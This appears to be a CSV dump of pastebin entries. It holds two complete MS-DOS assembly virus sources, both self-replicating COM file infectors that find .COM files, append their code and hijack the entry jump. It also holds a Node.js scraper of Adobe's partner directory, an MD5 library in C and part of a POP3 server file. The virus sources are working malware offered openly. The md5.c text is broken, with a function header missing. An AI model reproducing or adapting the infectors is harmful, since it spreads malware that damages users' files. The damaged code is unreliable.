id,title,username,language,date,content
bY1GbK6D,Virus.MSDOS.Unknown.203 - Non-overwriting COM Infector - Source Code,FlyFar,ASM (NASM),Thursday 16th of May 2024 06:53:25 AM CDT,"
;******************************************************************
;*                                                                *
;*     My First Virus, a simple non-overwriting COM infector      *
;*                                                                *
;*                                  by, Solomon                   *
;*                                                                *
;******************************************************************

                  .model tiny                   ; Memory model
                  .code                         ; Start Code
                  org 100h                      ; Start of COM file

MAIN:             db 0e9h,00h,00h               ; Jmp START_VIRUS

START_VIRUS       proc near                     ; Real start of Virus
                  call FIND_OFFSET

; Calculate change in offset from host program.

FIND_OFFSET:      pop bp                        ; BP holds current IP
                  sub bp, offset FIND_OFFSET    ; Calculate net change
                                                ; Change BP to start of
                                                ; virus code

; Restore original bytes to the infected program.

                  lea si,[bp+ORIG_START]        ; Restore original 3 bytes
                  mov di,100h                   ; to 100h, start of file
                  push di                       ; Copy 3 bytes
                  movsw
                  movsb

; Change the DTA from the default so FINDFIRST/FINDNEXT won't destroy
; original command line parameters.

                  lea dx,[bp+NEW_DTA]           ; Point to new DTA area
                  call SET_DTA                  ; Go change it

; DOS Findfirst / Findnext services


FINDFIRST:        mov ah,4eh                    ; DOS find first service
                  lea dx,[bp+COM_MASK]          ; Search for any COM file
                  xor cx,cx                     ; Attribute mask
FINDNEXT:         int 21h                       ; Call DOS to do it
                  jc QUIT                       ; Quit if there are errors
                                                ; or no more files

; Ok, if I am here, then I found a possible victim. Open the file and
; check it for previous infections.

                  mov ax,3d00h                  ; DOS Open file, read only
                  lea dx,[bp+NEW_DTA+30]        ; Point to filename we found
                  int 21h                       ; Call DOS to do it
                  xchg ax,bx                    ; Put file handle in BX

; Check file for previous infection by checking for our presence at
; then end of the file.

                  mov ah,3fh                    ; DOS Read file
                  lea dx,[bp+ORIG_START]        ; Save the original header
                  mov cx,3                      ; Read 3 bytes
                  int 21h                       ; Call DOS to do it
                  mov ax,word ptr [bp+NEW_DTA+26]   ; Put filename in AX
                  mov cx,word ptr [bp+ORIG_START+1] ; Jmp offset
                  add cx,END_VIRUS-START_VIRUS+3; Convert to filesize
                  cmp ax,cx                     ; Compare file size's
                  jnz INFECT_COM                ; If healthy, go infect it
                  mov ah,3eh                    ; Otherwise close file and
                  int 21h                       ; try to find another victim
                  mov ah,4fh                    ; DOS find next file
                  jmp short FINDNEXT            ; Find another file

; Restore default DTA and pass control back to original program.
; Call any activation routines here.

QUIT:             mov dx,80h                    ; Restore original DTA
                  call SET_DTA                  ; Go change it
                  retn                          ; End Virus and start original
                                                ; Program. Remember, DI holding
                                                ; 100h was pushed on the stack.

;*** Subroutine INFECT_COM ***

INFECT_COM:

; Reset the file attributes to normal so I can write to the file

                  mov ax,4301h                  ; DOS change file attr
                  xor cx,cx                     ; Zero attributes
                  lea dx,[bp+NEW_DTA+30]        ; Point to filename in DTA
                  int 21h                       ; Call DOS to do it

; Calculate jump offset for header of victim so it will run virus first.

                  mov ax,word ptr [bp+NEW_DTA+26] ; Put filesize in AX
                  sub ax,3                      ; Subtract 3, size-jmp_code
                  mov word ptr [bp+JMP_OFFSET],ax ; Store new offset

; Close the file and reopen it for read/write. BX still holds file handle.

                  mov ah,3eh                    ; DOS close file
                  int 21h                       ; Call DOS to do it
                  mov ax,3d02h                  ; DOS open file, read/write
                  int 21h                       ; Call DOS to do it
                  xchg ax,bx                    ; Put file handle in BX

; Write the new header at the beginning of the file.

                  mov ah,40h                    ; DOS write to file
                  mov cx,3                      ; Write 3 bytes
                  lea dx,[bp+HEADER]            ; Point to the 3 bytes to write
                  int 21h                       ; Call DOS to do it

; Move to end of file so I can append the virus to it.

                  mov al,2                      ; Select end of file
                  call FILE_PTR                 ; Go to end of file

; Append the virus to the end of the file.

                  mov ah,40h                    ; DOS write to file
                  mov cx,END_VIRUS-START_VIRUS  ; Length of virus
                  lea dx,[bp+START_VIRUS]       ; Start from beginning of virus
                  int 21h                       ; Call DOS to do it

; Restore the file's original timestamp and datestamp.  These values were
; stored in the DTA by the Findfirst / Findnext services.

                  mov ax,5701h                  ; DOS set file date & time
                  mov cx,word ptr [bp+NEW_DTA+22] ; Set time
                  mov dx,word ptr [bp+NEW_DTA+24] ; Set date
                  int 21h                       ; Call DOS to do it

; Restore original file attributes.

                  mov ax,4301h                  ; DOS change file attr
                  mov cx,word ptr [bp+NEW_DTA+21] ; Get original file attr
                  lea dx,[bp+NEW_DTA+30]        ; Point to file name
                  int 21h                       ; Call DOS

; Lastly, close the file and go back to main program.

                  mov ah,3eh                    ; DOS close file
                  int 21h                       ; Call DOS to do it
                  jmp QUIT                      ; We're done

;*** Subroutine SET_DTA ***

SET_DTA           proc near
                  mov ah,1ah                    ; DOS set DTA
                  int 21h                       ; Call DOS to do it
                  retn                          ; Return
SET_DTA           endp


;*** Subroutine FILE_PTR ***


FILE_PTR          proc near
                  mov ah,42h                    ; DOS set read/write pointer
                  xor cx,cx                     ; Set offset move to zero
                  cwd                           ; Equivalent to xor dx,dx
                  int 21h                       ; Call DOS to do it
                  retn                          ; Return
FILE_PTR          endp



; This area will hold all variables to be encrypted

COM_MASK          db '*.com',0                  ; COM file mask

ORIG_START        db 0cdh,20h,0                 ; Header for infected file

HEADER            db 0e9h                       ; Jmp command for new header

START_VIRUS       endp

END_VIRUS         equ $                         ; Mark end of virus code

; This data area is a scratch area and is not included in virus code.

JMP_OFFSET        dw ?                          ; Jump offset for new header
NEW_DTA           db 43 dup(?)                  ; New DTA location

                  end MAIN
"
dc9TyfJ8,Virus.MSDOS.Unknown.1st_star - Source Code,FlyFar,ASM (NASM),Thursday 16th of May 2024 06:52:13 AM CDT,"
;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
;
;       First-Star / 222 Virus
;
;       (C) by Glenn Benton in 1992
;       This is a non-resident direct action .COM infector in current dirs.
;
;
;
                Org 0h

Start:          Jmp MainVir
                Db '*'

MainVir:        Call On1
On1:            Pop BP
                Sub BP,Offset MainVir+3
                Push Ax
                Mov Ax,Cs:OrgPrg[BP]
                Mov Bx,Cs:OrgPrg[BP]+2
                Mov Cs:Start+100h,Ax
                Mov Cs:Start[2]+100h,Bx
		Mov Ah,1ah
		Mov Dx,0fd00h
		Int 21h
		Mov Ah,4eh
Search:         Lea Dx,FileSpec[BP]
		Xor Cx,Cx
		Int 21h
                Jnc Found
                Jmp Ready
Found:          Mov Ax,4300h
                Mov Dx,0fd1eh
                Int 21h
                Push Cx
                Mov Ax,4301h
                Xor Cx,Cx
                Int 21h
                Mov Ax,3d02h
                Int 21h
                Mov Bx,5700h
                Xchg Ax,Bx
                Int 21h
                Push Cx
                Push Dx
                Mov Ah,3fh
                Lea Dx,OrgPrg[BP]
                Mov Cx,4
                Int 21h
                Mov Ax,Cs:[OrgPrg][BP]
                Cmp Ax,'MZ'
                Je ExeFile
                Cmp Ax,'ZM'
                Je ExeFile
                Mov Ah,Cs:[OrgPrg+3][BP]
                Cmp Ah,'*'
                Jne Infect
ExeFile:        Call Close
                Mov Ah,4fh
                Jmp Search
FSeek:          Xor Cx,Cx
                Xor Dx,Dx
                Int 21h
                Ret
Infect:         Mov Ax,4202h
                Call FSeek
                Sub Ax,3
                Mov Cs:CallPtr[BP]+1,Ax
                Mov Ah,40h
                Lea Dx,MainVir[BP]
                Mov Cx,VirLen
                Int 21h
                Mov Ax,4200h
                Call FSeek
                Mov Ah,40h
                Lea Dx,CallPtr[BP]
                Mov Cx,4
                Int 21h
                Call Close
Ready:          Mov Ah,1ah
                Mov Dx,80h
                Int 21h
                Pop Ax
                Mov Bx,100h
                Push Cs
                Push Bx
                Retf
Close:          Pop Si
                Pop Dx
                Pop Cx
                Mov Ax,5701h
                Int 21h
                Mov Ah,3eh
                Int 21h
                Mov Ax,4301h
                Pop Cx
                Mov Dx,0fd1eh
                Int 21h
                Push Si
                Ret

CallPtr         Db 0e9h,0,0
FileSpec	Db '*.COM',0

OrgPrg:         Int 20h
                Nop
                Nop

VirLen          Equ $-MainVir

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;
;ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

"
wmfsB7xR,adobe_partners_scraper.js,jayankaghosh,JavaScript,Thursday 16th of May 2024 06:51:46 AM CDT,"const fetch = require('node-fetch');
const fs = require('fs');
const json = require(""./partners.json"");
const createCsvWriter = require('csv-writer').createObjectCsvWriter;

const LISTING_URL = 'https://partner-directory.adobe.io/v1/spp/listings';
const DETAILS_URL = 'https://partner-directory.adobe.io/v1/spp/listing/';
const JSON_FILE_NAME = __dirname + '/partners.json';
const CSV_FILE_NAME = __dirname + '/partners.csv';
const TOTAL_THREADS = 10;

const fetchListingPage = pageNumber => {
    return new Promise(async (resolve, reject) => {
        console.log(`FETCHING PAGE ${ pageNumber }`);
        let url = LISTING_URL;
        if (pageNumber) {
            url += '?page=' + pageNumber
        }
        const rawResponse = await fetch(url, {
            headers: {
                'X-Api-Key': 'partner_directory'
            }
        });
        const response = await rawResponse.json();
        resolve(response);
    });
}

let numberOfTimesDetailsLogged = 0;
const fetchDetails = id => {
    return new Promise(async (resolve, reject) => {
        console.log(`${++numberOfTimesDetailsLogged}. FETCHING DETAILS OF ${ id }`);
        const url = DETAILS_URL + id;
        const rawResponse = await fetch(url, {
            headers: {
                'X-Api-Key': 'partner_directory'
            }
        });
        const response = await rawResponse.json();
        resolve(response);
    });
}

const writeCSVFromJSON = async () => {
    console.log('Writing to CSV');
    const json = require(JSON_FILE_NAME);
    const csvData = [];
    const csvWriter = createCsvWriter({
        path: CSV_FILE_NAME,
        header: [
            {id: 'name', title: 'Name'},
            {id: 'level', title: 'Level'},
            {id: 'certifiedEmployees', title: 'Certified Employees'},
            {id: 'phone', title: 'Phone'},
            {id: 'website', title: 'Website'},
            {id: 'city', title: 'City'},
            {id: 'country', title: 'Country'},
            {id: 'countryId', title: 'Country ID'},
            {id: 'headquarter', title: 'Headquarter'},
            {id: 'address_name', title: 'Address Name'},
            {id: 'postalCode', title: 'Postal Code'},
            {id: 'regionId', title: 'Region ID'},
            {id: 'state', title: 'State'},
            {id: 'address1', title: 'Address 1'},
            {id: 'address2', title: 'Address 2'}
        ]
    });
    Object.values(json).forEach(company => {
        company.addresses.forEach(address => {
            csvData.push({
                'name': company.companyInfo.name,
                'level': company.companyInfo.level,
                'certifiedEmployees': company.companyInfo.certifiedEmployees,
                'phone': company.companyInfo.phone,
                'website': company.companyInfo.website,
                'city': address.city,
                'country': address.country,
                'countryId': address.countryId,
                'headquarter': (address.isHeadquarter ? 'Yes': 'No'),
                'address_name': address.name,
                'postalCode': address.postalCode,
                'regionId': address.regionId,
                'state': address.state,
                'address1': address.address1,
                'address2': address.address2,
            })
        });
    });
    await csvWriter.writeRecords(csvData);
    console.log('DONE');
}

(async () => {
    let list = [];
    let totalItems;
    const finalList = {};
    let totalPages = null;
    let currentPage = 0;
    while (true) {
        const { listings = [], totalPages: pages = null, currentPage: current = null } = await fetchListingPage(currentPage);
        list = [...list, ...listings];
        if (pages) {
            totalPages = pages;
        }
        if (current) {
            currentPage = parseInt(current);
        }
        currentPage++;
        if (totalPages < currentPage) {
            break;
        }
    }
    totalItems = list.length;

    const runner = async () => {
        if (list.length) {
            const {id} = list.shift();
            finalList[id] = await fetchDetails(id);
            await runner();
        }
    }

    for (let i = 0; i < TOTAL_THREADS; i++) {
        runner();
    }

    const processId = setInterval(() => {
        if (Object.keys(finalList).length === totalItems) {
            clearInterval(processId);
            fs.writeFileSync(JSON_FILE_NAME, JSON.stringify(finalList, null, 2));
            console.log('DONE');
            console.log('JSON written to file ' + JSON_FILE_NAME);
            writeCSVFromJSON();
        }
    }, 1000);
})();

"
nWzRFd7u,md5/md5.h,FlyFar,C,Thursday 16th of May 2024 06:49:24 AM CDT,"

#ifndef _MD5_H
#define _MD5_H 1

#include <stdio.h>

#if defined HAVE_LIMITS_H || _LIBC
# include <limits.h>
#endif


#ifdef _LIBC
# include <sys/types.h>
typedef u_int32_t md5_uint32;
#else
# if defined __STDC__ && __STDC__
#  define UINT_MAX_32_BITS 4294967295U
# else
#  define UINT_MAX_32_BITS 0xFFFFFFFF
# endif


# ifndef UINT_MAX
#  define UINT_MAX UINT_MAX_32_BITS
# endif

# if UINT_MAX == UINT_MAX_32_BITS
   typedef unsigned int md5_uint32;
# else
#  if USHRT_MAX == UINT_MAX_32_BITS
    typedef unsigned short md5_uint32;
#  else
#   if ULONG_MAX == UINT_MAX_32_BITS
     typedef unsigned long md5_uint32;
#   else
     /* The following line is intended to evoke an error.
        Using #error is not portable enough.  */
     ""Cannot determine unsigned 32-bit data type.""
#   endif
#  endif
# endif
#endif

#undef __P
#if defined (__STDC__) && __STDC__
#define	__P(x) x
#else
#define	__P(x) ()
#endif


struct md5_ctx
{
  md5_uint32 A;
  md5_uint32 B;
  md5_uint32 C;
  md5_uint32 D;

  md5_uint32 total[2];
  md5_uint32 buflen;
  char buffer[128];
};


extern void md5_init_ctx __P ((struct md5_ctx *ctx));


extern void md5_process_block __P ((const void *buffer, size_t len,
				    struct md5_ctx *ctx));

extern void md5_process_bytes __P ((const void *buffer, size_t len,
				    struct md5_ctx *ctx));


extern void *md5_finish_ctx __P ((struct md5_ctx *ctx, void *resbuf));



extern void *md5_read_ctx __P ((const struct md5_ctx *ctx, void *resbuf));



extern int md5_stream __P ((FILE *stream, void *resblock));


extern void *md5_buffer __P ((const char *buffer, size_t len, void *resblock));

#endif
"
vNbT6QaL,md5/md5.c,FlyFar,C,Thursday 16th of May 2024 06:47:37 AM CDT,"

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include <sys/types.h>

#if STDC_HEADERS || defined _LIBC
# include <stdlib.h>
# include <string.h>
#else
# ifndef HAVE_MEMCPY
#  define memcpy(d, s, n) bcopy ((s), (d), (n))
# endif
#endif

#include ""md5.h""

#ifdef _LIBC
# include <endian.h>
# if __BYTE_ORDER == __BIG_ENDIAN
#  define WORDS_BIGENDIAN 1
# endif
#endif

#ifdef WORDS_BIGENDIAN
# define SWAP(n)							\
    (((n) << 24) | (((n) & 0xff00) << 8) | (((n) >> 8) & 0xff00) | ((n) >> 24))
#else
# define SWAP(n) (n)
#endif


static const unsigned char fillbuf[64] = { 0x80, 0 /* , 0, 0, ...  */ };


/* Initialize structure containing state of computation.
   (RFC 1321, 3.3: Step 3)  */
void
md5_init_ctx (ctx)
     struct md5_ctx *ctx;
{
  ctx->A = 0x67452301;
  ctx->B = 0xefcdab89;
  ctx->C = 0x98badcfe;
  ctx->D = 0x10325476;

  ctx->total[0] = ctx->total[1] = 0;
  ctx->buflen = 0;
}


void *
md5_read_ctx (ctx, resbuf)
     const struct md5_ctx *ctx;
     void *resbuf;
{
  ((md5_uint32 *) resbuf)[0] = SWAP (ctx->A);
  ((md5_uint32 *) resbuf)[1] = SWAP (ctx->B);
  ((md5_uint32 *) resbuf)[2] = SWAP (ctx->C);
  ((md5_uint32 *) resbuf)[3] = SWAP (ctx->D);

  return resbuf;
}


  md5_uint32 bytes = ctx->buflen;
  size_t pad;

  /* Now count remaining bytes.  */
  ctx->total[0] += bytes;
  if (ctx->total[0] < bytes)
    ++ctx->total[1];

  pad = bytes >= 56 ? 64 + 56 - bytes : 56 - bytes;
  memcpy (&ctx->buffer[bytes], fillbuf, pad);

  /* Put the 64-bit file length in *bits* at the end of the buffer.  */
  *(md5_uint32 *) &ctx->buffer[bytes + pad] = SWAP (ctx->total[0] << 3);
  *(md5_uint32 *) &ctx->buffer[bytes + pad + 4] = SWAP ((ctx->total[1] << 3) |
							(ctx->total[0] >> 29));

  /* Process last bytes.  */
  md5_process_block (ctx->buffer, bytes + pad + 8, ctx);

  return md5_read_ctx (ctx, resbuf);
}


int
md5_stream (stream, resblock)
     FILE *stream;
     void *resblock;
{
  /* Important: BLOCKSIZE must be a multiple of 64.  */
#define BLOCKSIZE 4096
  struct md5_ctx ctx;
  char buffer[BLOCKSIZE + 72];
  size_t sum;

  /* Initialize the computation context.  */
  md5_init_ctx (&ctx);

  /* Iterate over full file contents.  */
  while (1)
    {
      
      size_t n;
      sum = 0;

      /* Read block.  Take care for partial reads.  */
      do
	{
	  n = fread (buffer + sum, 1, BLOCKSIZE - sum, stream);

	  sum += n;
	}
      while (sum < BLOCKSIZE && n != 0);
      if (n == 0 && ferror (stream))
        return 1;

      /* If end of file is reached, end the loop.  */
      if (n == 0)
	break;

      /* Process buffer with BLOCKSIZE bytes.  Note that
			BLOCKSIZE % 64 == 0
       */
      md5_process_block (buffer, BLOCKSIZE, &ctx);
    }

  /* Add the last bytes if necessary.  */
  if (sum > 0)
    md5_process_bytes (buffer, sum, &ctx);

  /* Construct result in desired memory.  */
  md5_finish_ctx (&ctx, resblock);
  return 0;
}


void *
md5_buffer (buffer, len, resblock)
     const char *buffer;
     size_t len;
     void *resblock;
{
  struct md5_ctx ctx;

  /* Initialize the computation context.  */
  md5_init_ctx (&ctx);

 
  md5_process_bytes (buffer, len, &ctx);

  /* Put result in desired memory area.  */
  return md5_finish_ctx (&ctx, resblock);
}


void
md5_process_bytes (buffer, len, ctx)
     const void *buffer;
     size_t len;
     struct md5_ctx *ctx;
{
  
  if (ctx->buflen != 0)
    {
      size_t left_over = ctx->buflen;
      size_t add = 128 - left_over > len ? len : 128 - left_over;

      memcpy (&ctx->buffer[left_over], buffer, add);
      ctx->buflen += add;

      if (left_over + add > 64)
	{
	  md5_process_block (ctx->buffer, (left_over + add) & ~63, ctx);
	  memcpy (ctx->buffer, &ctx->buffer[(left_over + add) & ~63],
		  (left_over + add) & 63);
	  ctx->buflen = (left_over + add) & 63;
	}

      buffer = (const char *) buffer + add;
      len -= add;
    }

  /* Process available complete blocks.  */
  if (len > 64)
    {
      md5_process_block (buffer, len & ~63, ctx);
      buffer = (const char *) buffer + (len & ~63);
      len &= 63;
    }

  /* Move remaining bytes in internal buffer.  */
  if (len > 0)
    {
      memcpy (ctx->buffer, buffer, len);
      ctx->buflen = len;
    }
}



#define FF(b, c, d) (d ^ (b & (c ^ d)))
#define FG(b, c, d) FF (d, b, c)
#define FH(b, c, d) (b ^ c ^ d)
#define FI(b, c, d) (c ^ (b | ~d))


void
md5_process_block (buffer, len, ctx)
     const void *buffer;
     size_t len;
     struct md5_ctx *ctx;
{
  md5_uint32 correct_words[16];
  const md5_uint32 *words = buffer;
  size_t nwords = len / sizeof (md5_uint32);
  const md5_uint32 *endp = words + nwords;
  md5_uint32 A = ctx->A;
  md5_uint32 B = ctx->B;
  md5_uint32 C = ctx->C;
  md5_uint32 D = ctx->D;

 
  ctx->total[0] += len;
  if (ctx->total[0] < len)
    ++ctx->total[1];

  /* Process all bytes in the buffer with 64 bytes in each round of
     the loop.  */
  while (words < endp)
    {
      md5_uint32 *cwp = correct_words;
      md5_uint32 A_save = A;
      md5_uint32 B_save = B;
      md5_uint32 C_save = C;
      md5_uint32 D_save = D;

      

#define OP(a, b, c, d, s, T)						\
      do								\
        {								\
	  a += FF (b, c, d) + (*cwp++ = SWAP (*words)) + T;		\
	  ++words;							\
	  CYCLIC (a, s);						\
	  a += b;							\
        }								\
      while (0)

      
#define CYCLIC(w, s) (w = (w << s) | (w >> (32 - s)))

      /* Before we start, one word to the strange constants.
	 They are defined in RFC 1321 as

	 T[i] = (int) (4294967296.0 * fabs (sin (i))), i=1..64
       */

      /* Round 1.  */
      OP (A, B, C, D,  7, 0xd76aa478);
      OP (D, A, B, C, 12, 0xe8c7b756);
      OP (C, D, A, B, 17, 0x242070db);
      OP (B, C, D, A, 22, 0xc1bdceee);
      OP (A, B, C, D,  7, 0xf57c0faf);
      OP (D, A, B, C, 12, 0x4787c62a);
      OP (C, D, A, B, 17, 0xa8304613);
      OP (B, C, D, A, 22, 0xfd469501);
      OP (A, B, C, D,  7, 0x698098d8);
      OP (D, A, B, C, 12, 0x8b44f7af);
      OP (C, D, A, B, 17, 0xffff5bb1);
      OP (B, C, D, A, 22, 0x895cd7be);
      OP (A, B, C, D,  7, 0x6b901122);
      OP (D, A, B, C, 12, 0xfd987193);
      OP (C, D, A, B, 17, 0xa679438e);
      OP (B, C, D, A, 22, 0x49b40821);

      
#undef OP
#define OP(f, a, b, c, d, k, s, T)					\
      do 								\
	{								\
	  a += f (b, c, d) + correct_words[k] + T;			\
	  CYCLIC (a, s);						\
	  a += b;							\
	}								\
      while (0)

      /* Round 2.  */
      OP (FG, A, B, C, D,  1,  5, 0xf61e2562);
      OP (FG, D, A, B, C,  6,  9, 0xc040b340);
      OP (FG, C, D, A, B, 11, 14, 0x265e5a51);
      OP (FG, B, C, D, A,  0, 20, 0xe9b6c7aa);
      OP (FG, A, B, C, D,  5,  5, 0xd62f105d);
      OP (FG, D, A, B, C, 10,  9, 0x02441453);
      OP (FG, C, D, A, B, 15, 14, 0xd8a1e681);
      OP (FG, B, C, D, A,  4, 20, 0xe7d3fbc8);
      OP (FG, A, B, C, D,  9,  5, 0x21e1cde6);
      OP (FG, D, A, B, C, 14,  9, 0xc33707d6);
      OP (FG, C, D, A, B,  3, 14, 0xf4d50d87);
      OP (FG, B, C, D, A,  8, 20, 0x455a14ed);
      OP (FG, A, B, C, D, 13,  5, 0xa9e3e905);
      OP (FG, D, A, B, C,  2,  9, 0xfcefa3f8);
      OP (FG, C, D, A, B,  7, 14, 0x676f02d9);
      OP (FG, B, C, D, A, 12, 20, 0x8d2a4c8a);

      /* Round 3.  */
      OP (FH, A, B, C, D,  5,  4, 0xfffa3942);
      OP (FH, D, A, B, C,  8, 11, 0x8771f681);
      OP (FH, C, D, A, B, 11, 16, 0x6d9d6122);
      OP (FH, B, C, D, A, 14, 23, 0xfde5380c);
      OP (FH, A, B, C, D,  1,  4, 0xa4beea44);
      OP (FH, D, A, B, C,  4, 11, 0x4bdecfa9);
      OP (FH, C, D, A, B,  7, 16, 0xf6bb4b60);
      OP (FH, B, C, D, A, 10, 23, 0xbebfbc70);
      OP (FH, A, B, C, D, 13,  4, 0x289b7ec6);
      OP (FH, D, A, B, C,  0, 11, 0xeaa127fa);
      OP (FH, C, D, A, B,  3, 16, 0xd4ef3085);
      OP (FH, B, C, D, A,  6, 23, 0x04881d05);
      OP (FH, A, B, C, D,  9,  4, 0xd9d4d039);
      OP (FH, D, A, B, C, 12, 11, 0xe6db99e5);
      OP (FH, C, D, A, B, 15, 16, 0x1fa27cf8);
      OP (FH, B, C, D, A,  2, 23, 0xc4ac5665);

      /* Round 4.  */
      OP (FI, A, B, C, D,  0,  6, 0xf4292244);
      OP (FI, D, A, B, C,  7, 10, 0x432aff97);
      OP (FI, C, D, A, B, 14, 15, 0xab9423a7);
      OP (FI, B, C, D, A,  5, 21, 0xfc93a039);
      OP (FI, A, B, C, D, 12,  6, 0x655b59c3);
      OP (FI, D, A, B, C,  3, 10, 0x8f0ccc92);
      OP (FI, C, D, A, B, 10, 15, 0xffeff47d);
      OP (FI, B, C, D, A,  1, 21, 0x85845dd1);
      OP (FI, A, B, C, D,  8,  6, 0x6fa87e4f);
      OP (FI, D, A, B, C, 15, 10, 0xfe2ce6e0);
      OP (FI, C, D, A, B,  6, 15, 0xa3014314);
      OP (FI, B, C, D, A, 13, 21, 0x4e0811a1);
      OP (FI, A, B, C, D,  4,  6, 0xf7537e82);
      OP (FI, D, A, B, C, 11, 10, 0xbd3af235);
      OP (FI, C, D, A, B,  2, 15, 0x2ad7d2bb);
      OP (FI, B, C, D, A,  9, 21, 0xeb86d391);

      /* Add the starting values of the context.  */
      A += A_save;
      B += B_save;
      C += C_save;
      D += D_save;
    }

  /* Put checksum in context given as argument.  */
  ctx->A = A;
  ctx->B = B;
  ctx->C = C;
  ctx->D = D;
}
"
YjbdfWuD,virtual.c,FlyFar,C,Thursday 16th of May 2024 06:42:54 AM CDT,"#ifdef VIRTUAL
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>

#include ""pop3.h""

/* Real globals used in other files. */
int virtual_mode=0;
extern char *svr_hostname;
char *virt_spooldir=0;
char *virt_workdir=0;

/* Local globals only seen in this file */
static struct sockaddr_in virtual_addr;
static struct sockaddr_in *virtual_ptr;


struct virttable {
	char *ipaddr;
	char *spooldir;
	char *workdir;
};
static struct virttable virt_table[]={
	{""127.0.0.1"",		""/usr/spool/mail/"",	""/usr/tmp/.pop/""},
	{""204.181.147.2"",	""/usr/spool/mail/"",	""/usr/tmp/.pop/""},
	{NULL, NULL}
};

void
get_virt(char *ip) {
	int i;

	if(virtual_mode) {
		for(i=0; virt_table[i].ipaddr; ++i) {
			if( !strcmp(virt_table[i].ipaddr,ip) ) {
				virt_workdir = virt_table[i].workdir;
				virt_spooldir= virt_table[i].spooldir;
				return;
			}
		} /* end for */
	} /* end if*/
	return;

} /* end get_virt */


void
virt_init() {
	int virtual_len;
	char *cptr;
	struct hostent *hostent;

	virtual_len = sizeof(virtual_addr);
	if (getsockname(0, (struct sockaddr *) &virtual_addr,
			&virtual_len) >= 0) {
		virtual_mode = 1;
		virtual_ptr = (struct sockaddr_in *) &virtual_addr;
		free(svr_hostname);
		cptr = inet_ntoa(virtual_ptr->sin_addr);
		if(hostent=gethostbyaddr((char *) &virtual_ptr->sin_addr,
				sizeof(struct in_addr),AF_INET)) {
			svr_hostname = malloc(strlen(hostent->h_name)+1);
			if (svr_hostname == NULL)
				fail(FAIL_OUT_OF_MEMORY);
			strcpy(svr_hostname,hostent->h_name);
		} else {
			svr_hostname = malloc(strlen(cptr)+1);
			if (svr_hostname == NULL)
				fail(FAIL_OUT_OF_MEMORY);
			strcpy(svr_hostname,cptr);
		}
	}

	get_virt(cptr);

} /* end virt_init */

#endif
#if 0

unix_pass(name, passwd)
char	*name;
char	*passwd;
{
	struct passwd	*pwd;
	struct passwd	*getpwnam();
	char		*encpw;
	char		*crypt();
	char		*encrypted_pass;
#if !defined(NOSHADOW)
	struct spwd	*spwd;

	
	if((spwd = fgetspnam(name)) == NULL) {
		return(-1);
	}
	encrypted_pass = spwd->sp_pwdp;

#else  /* !NOSHADOW */

	
	if((pwd = fgetpwnam(name)) == NULL) {
		return(-1);
	}
	encrypted_pass = pwd->pw_passwd;

#endif /* !NOSHADOW */
	
	
	encpw = crypt(passwd, encrypted_pass);

	/* Check it */
	if(strcmp(encpw, encrypted_pass)) {
		return(-1);
	}
	return(0);
}


struct passwd *
fgetpwnam(char *name)
{
	struct passwd *pw;
	FILE *fp;

	if( (fp=fopen(RAD_PASSWD,""r"")) == NULL ) {
		perror(""Couldn't open radius passwd file"");
		exit(1);
	}

	while ( pw=fgetpwent(fp) ) {
		if( !strcmp(name,pw->pw_name) ) {
			fclose(fp);
			return( pw );
		}
	}
	fclose(fp);
	return( NULL );
} /* end fgetpwnam */

struct spwd *
fgetspnam(char *name)
{
	struct spwd *pw;
	FILE *fp;

	if( (fp=fopen(RAD_SHADOW,""r"")) == NULL ) {
		perror(""Couldn't open radius shadow file"");
		exit(1);
	}

